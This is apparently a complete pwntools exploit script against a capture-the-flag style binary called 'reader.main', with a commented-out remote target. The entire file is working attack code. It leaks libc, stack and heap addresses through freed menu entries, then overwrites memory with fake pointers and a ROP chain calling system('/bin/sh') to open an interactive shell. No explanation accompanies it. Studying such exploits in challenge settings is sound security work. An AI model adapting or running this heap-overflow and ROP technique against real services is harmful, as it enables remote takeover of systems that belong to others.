from pwn import *
from binascii import hexlify

r = process('./reader.main')
#r = remote('10.99.99.16',19999)
elf = ELF('reader.main')
lib = ELF('libc-2.23.so')

def inputPaper(index,con,tit,des):
	r.sendlineafter('(q)uit\n\n>','2')
	r.sendlineafter('>',str(index))
	r.sendafter('>',con)
	r.sendafter('>',tit)
	r.sendafter('>',des)
def inputBook(index,con,tit,des):
	r.sendlineafter('(q)uit\n\n>','3')
	r.sendlineafter('>',str(index))
	r.sendafter('>',con)
	r.sendafter('>',tit)
	r.sendafter('>',des)
def delete(choice,index):
	r.sendlineafter('(q)uit\n\n>','7')
	r.sendlineafter('>',str(choice))
	r.sendlineafter('>',str(index))

inputPaper(1,'a'*0x4f+'\n','a','a')
delete(1,1)
r.recvuntil('a\n')
leak0 = u64(r.recv(6).ljust(8,'\x00'))
libase = leak0 - lib.symbols['_IO_2_1_stdin_']
log.info('LIBC BASE -> '+str(hex(libase)))

inputPaper(2,'a'*0x6f+'\n','aa','bb')
delete(1,2)
r.recvuntil('a\n')
leak1 = u64(r.recv(6).ljust(8,'\x00'))
x_rbp = leak1
log.info('STACK PTR -> '+str(hex(x_rbp)))

inputPaper(3,'a'*0x97+'\n','aaa','bbb')
delete(1,3)
r.recvuntil('a\n')
leak2 = u64(r.recv(6).ljust(8,'\x00'))
hpbase = leak2 - 0x1b20
log.info('HEAP BASE -> '+str(hex(hpbase)))

pop_rdi_ret = 0x21102
bin_sh = 0x18cd57
fuckdes = 'a'*0x78+p64(hpbase+0x238)+p64(0x0)+p64(x_rbp-0x130)
fuckdes += p64(x_rbp+0x40)
fuckdes += p64(libase+pop_rdi_ret)
fuckdes += p64(libase+bin_sh)
fuckdes += p64(libase+lib.symbols['system'])
fuckdes += p64(0xdeadbeefcafebabe)
inputBook(2,'a'*0x78+p64(0x15011111111),'aa',fuckdes)
inputBook(1,'b'*0xff,'bb','\xff'*0x80+p64(0x28000000001))

delete(2,2)
r.interactive()
